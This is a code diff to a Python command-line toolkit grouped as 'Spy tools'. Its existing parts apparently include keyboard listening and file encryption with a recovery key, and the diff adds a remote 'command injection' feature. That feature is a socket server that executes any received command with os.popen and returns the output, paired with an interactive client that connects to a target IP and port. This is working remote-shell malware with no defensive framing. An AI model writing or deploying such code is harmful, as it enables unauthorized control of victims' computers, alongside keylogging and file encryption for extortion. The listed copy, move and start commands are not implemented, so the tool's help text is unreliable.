@@ -1,7 +1,11 @@
-import os, click
+import click
+import os
 from pynput.keyboard import Listener
 from lash.Exportables.ikeyboard import *
 import pyaes as pya
+import socket
+from datetime import datetime
+import logging as log
 
 
 @click.group('spy', help='Spy tools')
@@ -82,3 +86,67 @@ def crypt(p, key, dc, ex, cl):
                 pass
             open('recovery-key.txt', 'w').write(key)
         print(f'\nFile(s) encrypted with key: {key}')
+
+
+@spy.command(help='Command injection')
+@click.option('-h', '-host', type=click.STRING, help='Host this machine for remote access, pass the port Ex: -h 8080')
+@click.option('-c', '-connect', type=click.STRING, nargs=2, help='Connect to a host by it\' IP, port. Ex: -c 192.168.1.1 8080')
+def injection(h, c):
+    buffer = 1024 ** 2
+    if h:
+        try:
+            h = int(h)
+        except ValueError as error:
+            print(f'{error}: Invalid port {h}, the value needs be a integer number like 4254 or 8234')
+            return
+        host = socket.gethostbyname(socket.gethostname())
+        port = h
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.bind((host, port))
+            print(f'Server online [ host: {host}, port: {port} ] Waiting a connection...')
+            s.listen()
+            conn, addr = s.accept()
+            with conn:
+                print(f'Client connected: {addr}')
+                while conn:
+                    conn.sendall(bytes(os.getcwd(), 'utf-8'))
+                    data = conn.recv(buffer).decode('utf-8')
+                    if data[0:6].strip() == '-chdir':
+                        os.chdir(data[7:])
+                        conn.send(bytes(os.getcwd(), 'utf-8'))
+                    elif data == '-quit':
+                        quit(0)
+                    else:
+                        try:
+                            output = os.popen(data).read()
+                            conn.send(bytes(output, 'utf-8'))
+                        except Exception as e:
+                            conn.send(bytes(f'Command failed: {e}'))
+                        print(f'({datetime.now().time()}) Command executed: {data}')
+            quit(0)
+
+    elif c:
+        host, port = c
+        try:
+            port = int(port)
+        except ValueError as error:
+            print(f'{error}: Invalid port {port}, the value needs be a integer number like 4254 or 8234')
+            return
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((host, port))
+            print('\nConnected successfully, remote injection is now active')
+            print('You need to use the custom commands instead the system defaults\n')
+            print(f'{"-"*24}   Custom commands   {"-"*24}')
+            print('[-chdir path]                 Change the the remote directory')
+            print('[-start x]                    Start something on host ')
+            print('[-quit]                       Kill server')
+            print('[-copy path_host path_local]  Copy a file from host to your machine')
+            print('[-move path_local path_host]  Move a file from your machine to host')
+            print('\nCaution! if you send a incorrect command, the connection will be lost\n')
+            while True:
+                path = s.recv(buffer).decode('utf-8')
+                command = str(input(f'{host}/{path}>>> '))
+                s.sendall(bytes(command, 'utf-8'))
+                print(s.recv(buffer).decode('utf-8'))
+    else:
+        print('Error: No option passed')
